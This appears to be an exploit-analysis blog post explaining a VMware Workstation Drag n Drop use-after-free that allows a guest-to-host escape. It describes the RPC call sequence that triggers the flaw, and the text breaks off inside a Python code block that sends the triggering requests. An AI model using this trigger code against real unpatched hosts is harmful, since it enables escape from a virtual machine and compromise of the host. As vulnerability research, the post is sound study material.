@@ -1,0 +1,2307 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.3.1, mkdocs-material-8.5.2+insiders-4.23.5">
+    
+    
+      
+        <title>Analysis of a VMWare Guest-to-Host Escape from Pwn2Own 2017 - linxz.tech</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.5014570d.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.cbb835fc.min.css">
+        
+          
+          
+          <meta name="theme-color" content="#000000">
+        
+      
+      
+
+    
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=JetBrains+Mono:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"JetBrains Mono";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../stylesheets/extra.css">
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="green">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#introduction" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../.." title="linxz.tech" class="md-header__button md-logo" aria-label="linxz.tech" data-md-component="logo">
+      
+  <img src="../../../assets/logo.jpg" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            linxz.tech
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Analysis of a VMWare Guest-to-Host Escape from Pwn2Own 2017
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            <nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-tabs__inner md-grid">
+    <ul class="md-tabs__list">
+      
+        
+
+
+
+
+  
+    <li class="md-tabs__item">
+      <a href="../../.." class="md-tabs__link">
+        
+  
+  Linxz' Blog
+
+      </a>
+    </li>
+  
+
+      
+        
+
+
+
+
+  
+    <li class="md-tabs__item">
+      <a href="../../../about/" class="md-tabs__link">
+        
+  
+  About
+
+      </a>
+    </li>
+  
+
+      
+        
+
+
+
+
+  
+    <li class="md-tabs__item">
+      <a href="../../../tags/" class="md-tabs__link">
+        
+  
+  Tags
+
+      </a>
+    </li>
+  
+
+      
+        
+
+  
+
+
+
+
+  
+    
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../" class="md-tabs__link md-tabs__link--active">
+          
+  
+    
+  
+  Posts
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+                
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" hidden>
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="linxz.tech" class="md-nav__button md-logo" aria-label="linxz.tech" data-md-component="logo">
+      
+  <img src="../../../assets/logo.jpg" alt="logo">
+
+    </a>
+    linxz.tech
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Linxz' Blog
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../about/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    About
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../tags/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Tags
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+          <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4" type="checkbox" id="__nav_4" checked>
+        
+        
+          <label class="md-nav__link" for="__nav_4">
+            
+  
+  <span class="md-ellipsis">
+    Posts
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" aria-label="Posts" data-md-level="1">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            Posts
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Latest Posts
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_2" type="checkbox" id="__nav_4_2" >
+        
+        
+          <label class="md-nav__link" for="__nav_4_2">
+            
+  
+  <span class="md-ellipsis">
+    2019
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" aria-label="2019" data-md-level="2">
+          <label class="md-nav__title" for="__nav_4_2">
+            <span class="md-nav__icon md-icon"></span>
+            2019
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../2019/2019-08-31-NetSecFocus-AES-Challenge/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    NetSecFocus BSides Cymru AES Challenge
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../2019/2019-12-8-BAE-ctf-crypto3/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    BAE x BSides Chelt CTF
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+          <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3" type="checkbox" id="__nav_4_3" checked>
+        
+        
+          <label class="md-nav__link" for="__nav_4_3">
+            
+  
+  <span class="md-ellipsis">
+    2021
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" aria-label="2021" data-md-level="2">
+          <label class="md-nav__title" for="__nav_4_3">
+            <span class="md-nav__icon md-icon"></span>
+            2021
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    Analysis of a VMWare Guest-to-Host Escape from Pwn2Own 2017
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  <span class="md-ellipsis">
+    Analysis of a VMWare Guest-to-Host Escape from Pwn2Own 2017
+    
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#introduction" class="md-nav__link">
+    <span class="md-ellipsis">
+      Introduction
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#summary" class="md-nav__link">
+    <span class="md-ellipsis">
+      Summary
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#setup" class="md-nav__link">
+    <span class="md-ellipsis">
+      Setup
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#preliminary-analysis" class="md-nav__link">
+    <span class="md-ellipsis">
+      Preliminary Analysis
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Preliminary Analysis">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#toolscapabilitydnd_version" class="md-nav__link">
+    <span class="md-ellipsis">
+      tools.capability.dnd_version
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#vmxcapabilitydnd_version" class="md-nav__link">
+    <span class="md-ellipsis">
+      vmx.capability.dnd_version
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#recap" class="md-nav__link">
+    <span class="md-ellipsis">
+      Recap
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#dndsetguestfileroot" class="md-nav__link">
+    <span class="md-ellipsis">
+      dnd.setGuestFileRoot
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#analysing-the-crash" class="md-nav__link">
+    <span class="md-ellipsis">
+      Analysing the Crash
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#reallocation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Reallocation
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Reallocation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#toolscapabilityguest_temp_directory" class="md-nav__link">
+    <span class="md-ellipsis">
+      tools.capability.guest_temp_directory
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#guestupgradersend_cmd_line_args" class="md-nav__link">
+    <span class="md-ellipsis">
+      guest.upgrader.send_cmd_line_args
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#avoiding-nulls" class="md-nav__link">
+    <span class="md-ellipsis">
+      Avoiding NULLs
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#code-execution" class="md-nav__link">
+    <span class="md-ellipsis">
+      Code Execution
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#bypassing-dep" class="md-nav__link">
+    <span class="md-ellipsis">
+      Bypassing DEP
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Bypassing DEP">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#unitywindowcontentsstart" class="md-nav__link">
+    <span class="md-ellipsis">
+      unity.window.contents.start
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#unitywindowcontentschunk" class="md-nav__link">
+    <span class="md-ellipsis">
+      unity.window.contents.chunk
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#bypassing-aslr" class="md-nav__link">
+    <span class="md-ellipsis">
+      Bypassing ASLR
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#stack-pivot" class="md-nav__link">
+    <span class="md-ellipsis">
+      Stack Pivot
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#building-a-rop-chain" class="md-nav__link">
+    <span class="md-ellipsis">
+      Building a ROP Chain
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_4" type="checkbox" id="__nav_4_4" >
+        
+        
+          <label class="md-nav__link" for="__nav_4_4">
+            
+  
+  <span class="md-ellipsis">
+    2022
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" aria-label="2022" data-md-level="2">
+          <label class="md-nav__title" for="__nav_4_4">
+            <span class="md-nav__icon md-icon"></span>
+            2022
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../2022/2022-05-14-HEVD3-StackOverflow/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    HackSys Extreme Vulnerable Driver 3 - Stack Overflow + SMEP Bypass
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../2022/2022-05-21-HEVD3-DoubleFetch/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    HackSys Extreme Vulnerable Driver 3 - Double Fetch
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../2022/2022-06-11-HEVD3-MemoryDisclosure/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    HackSys Extreme Vulnerable Driver 3 - Memory Disclosure
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+                
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#introduction" class="md-nav__link">
+    <span class="md-ellipsis">
+      Introduction
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#summary" class="md-nav__link">
+    <span class="md-ellipsis">
+      Summary
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#setup" class="md-nav__link">
+    <span class="md-ellipsis">
+      Setup
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#preliminary-analysis" class="md-nav__link">
+    <span class="md-ellipsis">
+      Preliminary Analysis
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Preliminary Analysis">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#toolscapabilitydnd_version" class="md-nav__link">
+    <span class="md-ellipsis">
+      tools.capability.dnd_version
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#vmxcapabilitydnd_version" class="md-nav__link">
+    <span class="md-ellipsis">
+      vmx.capability.dnd_version
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#recap" class="md-nav__link">
+    <span class="md-ellipsis">
+      Recap
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#dndsetguestfileroot" class="md-nav__link">
+    <span class="md-ellipsis">
+      dnd.setGuestFileRoot
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#analysing-the-crash" class="md-nav__link">
+    <span class="md-ellipsis">
+      Analysing the Crash
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#reallocation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Reallocation
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Reallocation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#toolscapabilityguest_temp_directory" class="md-nav__link">
+    <span class="md-ellipsis">
+      tools.capability.guest_temp_directory
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#guestupgradersend_cmd_line_args" class="md-nav__link">
+    <span class="md-ellipsis">
+      guest.upgrader.send_cmd_line_args
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#avoiding-nulls" class="md-nav__link">
+    <span class="md-ellipsis">
+      Avoiding NULLs
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#code-execution" class="md-nav__link">
+    <span class="md-ellipsis">
+      Code Execution
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#bypassing-dep" class="md-nav__link">
+    <span class="md-ellipsis">
+      Bypassing DEP
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Bypassing DEP">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#unitywindowcontentsstart" class="md-nav__link">
+    <span class="md-ellipsis">
+      unity.window.contents.start
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#unitywindowcontentschunk" class="md-nav__link">
+    <span class="md-ellipsis">
+      unity.window.contents.chunk
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#bypassing-aslr" class="md-nav__link">
+    <span class="md-ellipsis">
+      Bypassing ASLR
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#stack-pivot" class="md-nav__link">
+    <span class="md-ellipsis">
+      Stack Pivot
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#building-a-rop-chain" class="md-nav__link">
+    <span class="md-ellipsis">
+      Building a ROP Chain
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+  
+  
+
+
+  <nav class="md-tags" >
+    
+      
+      
+        <a href="../../../tags/#hypervisor-exploitation" class="md-tag">hypervisor-exploitation</a>
+      
+    
+  </nav>
+
+
+
+
+<h2 id="introduction">Introduction<a class="headerlink" href="#introduction" title="Permanent link">&para;</a></h2>
+<p>This vulnerability was found by Keen Security Lab which they showed at Pwn2Own 2017. Unfortunately, because the bug was silently patched by VMWare in 12.5.3 no CVE number was assigned, even though the vulnerability leads to remote code execution.</p>
+<h1 id="summary">Summary<a class="headerlink" href="#summary" title="Permanent link">&para;</a></h1>
+<p>The vulnerability affects the Drag n Drop functionality of VMWare Workstation Pro before 12.5.3. This feature allows users to copy files from the host to the guest. However, due to a few insecure backdoor calls over an RPC interface, a Use-After-Free is present.</p>
+<p>In order to trigger the UAF, we have to issue RPC calls in order to change the DnD version from version 2 then to version 4. When the DnD version is changed the funtion table responsible for dispatching version 2 gets freed but any subsequent RPC calls will still reference the freed function table thus leading to a UAF.</p>
+<h1 id="setup">Setup<a class="headerlink" href="#setup" title="Permanent link">&para;</a></h1>
+<p>Explaining how to communicate over RPC with Python is out of the scope of this article. In my case, I have built a Python script with the necessary functions to communicate over RPC. With all of those functions created, I have then made one final function <code>RpcSendRequest</code> which sends the final requests to trigger the vulnerability.</p>
+<p>In the below code block, I have featured a high-level overview of the exploit chain based on the required RPC calls to trigger the vulnerability.</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-0-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-0-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-0-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-0-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-0-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-0-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-0-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-0-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-0-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-0-10">10</a></span>
+<span class="normal"><a href="#__codelineno-0-11">11</a></span>
+<span class="normal"><a href="#__codelineno-0-12">12</a></span>
+<span class="normal"><a href="#__codelineno-0-13">13</a></span>
+<span class="normal"><a href="#__codelineno-0-14">14</a></span>
+<span class="normal"><a href="#__codelineno-0-15">15</a></span>
+<span class="normal"><a href="#__codelineno-0-16">16</a></span>
+<span class="normal"><a href="#__codelineno-0-17">17</a></span>
+<span class="normal"><a href="#__codelineno-0-18">18</a></span>
+<span class="normal"><a href="#__codelineno-0-19">19</a></span>
+<span class="normal"><a href="#__codelineno-0-20">20</a></span>
+<span class="normal"><a href="#__codelineno-0-21">21</a></span>
+<span class="normal"><a href="#__codelineno-0-22">22</a></span>
+<span class="normal"><a href="#__codelineno-0-23">23</a></span>
+<span class="normal"><a href="#__codelineno-0-24">24</a></span>
+<span class="normal"><a href="#__codelineno-0-25">25</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1"></a>    <span class="n">dndver2</span> <span class="o">=</span> <span class="n">create_string_buffer</span><span class="p">(</span><span class="s2">&quot;tools.capability.dnd_version 2&quot;</span><span class="p">)</span>
+<a id="__codelineno-0-2" name="__codelineno-0-2"></a>    <span class="n">dndver4</span> <span class="o">=</span> <span class="n">create_string_buffer</span><span class="p">(</span><span class="s2">&quot;tools.capability.dnd_version 4&quot;</span><span class="p">)</span>
+<a id="__codelineno-0-3" name="__codelineno-0-3"></a>    <span class="n">chgver</span>  <span class="o">=</span> <span class="n">create_string_buffer</span><span class="p">(</span><span class="s2">&quot;vmx.capability.dnd_version&quot;</span><span class="p">)</span>
+<a id="__codelineno-0-4" name="__codelineno-0-4"></a>    <span class="n">sgfr</span>     <span class="o">=</span> <span class="n">create_string_buffer</span><span class="p">(</span><span class="s2">&quot;dnd.setGuestFileRoot BBBBB&quot;</span><span class="p">)</span>
+<a id="__codelineno-0-5" name="__codelineno-0-5"></a>
+<a id="__codelineno-0-6" name="__codelineno-0-6"></a>    <span class="n">outLen</span> <span class="o">=</span> <span class="n">c_ulong</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span>
+<a id="__codelineno-0-7" name="__codelineno-0-7"></a>    <span class="n">outbuf</span> <span class="o">=</span> <span class="n">kernel32</span><span class="o">.</span><span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">outLen</span><span class="o">.</span><span class="n">value</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span><span class="p">)</span>
+<a id="__codelineno-0-8" name="__codelineno-0-8"></a>
+<a id="__codelineno-0-9" name="__codelineno-0-9"></a>    <span class="c1"># Set Version 2</span>
+<a id="__codelineno-0-10" name="__codelineno-0-10"></a>    <span class="n">Rpc</span><span class="o">.</span><span class="n">SendReq</span><span class="p">(</span><span class="n">addressof</span><span class="p">(</span><span class="n">dndver2</span><span class="p">),</span> <span class="n">sizeof</span><span class="p">(</span><span class="n">dndver2</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="n">outbuf</span><span class="p">,</span> <span class="n">pointer</span><span class="p">(</span><span class="n">outLen</span><span class="p">))</span>
+<a id="__codelineno-0-11" name="__codelineno-0-11"></a>    <span class="n">outLen</span><span class="o">.</span><span class="n">value</span> <span class="o">=</span> <span class="mh">0x1000</span>
+<a id="__codelineno-0-12" name="__codelineno-0-12"></a>
+<a id="__codelineno-0-13" name="__codelineno-0-13"></a>    <span class="c1"># Change Version</span>
+<a id="__codelineno-0-14" name="__codelineno-0-14"></a>    <span class="n">Rpc</span><span class="o">.</span><span class="n">SendReq</span><span class="p">(</span><span class="n">addressof</span><span class="p">(</span><span class="n">chgver</span><span class="p">),</span> <span class="n">sizeof</span><span class="p">(</span><span class="n">chgver</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="n">outbuf</span><span class="p">,</span> <span class="n">pointer</span><span class="p">(</span><span class="n">outLen</span><span class="p">))</span>
+<a id="__codelineno-0-15" name="__codelineno-0-15"></a>    <span class="n">outLen</span><span class="o">.</span><span class="n">value</span> <span class="o">=</span> <span class="mh">0x1000</span>
+<a id="__codelineno-0-16" name="__codelineno-0-16"></a>
+<a id="__codelineno-0-17" name="__codelineno-0-17"></a>    <span class="c1"># Set Version 4</span>
+<a id="__codelineno-0-18" name="__codelineno-0-18"></a>    <span class="n">Rpc</span><span class="o">.</span><span class="n">SendReq</span><span class="p">(</span><span class="n">addressof</span><span class="p">(</span><span class="n">dndver4</span><span class="p">),</span> <span class="n">sizeof</span><span class="p">(</span><span class="n">dndver4</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="n">outbuf</span><span class="p">,</span> <span class="n">pointer</span><span class="p">(</span><span class="n">outLen</span><span class="p">))</span>
+<a id="__codelineno-0-19" name="__codelineno-0-19"></a>    <span class="n">outLen</span><span class="o">.</span><span class="n">value</span> <span class="o">=</span> <span class="mh">0x1000</span>
+<a id="__codelineno-0-20" name="__codelineno-0-20"></a>
+<a id="__codelineno-0-21" name="__codelineno-0-21"></a>    <span class="c1"># Change Version</span>
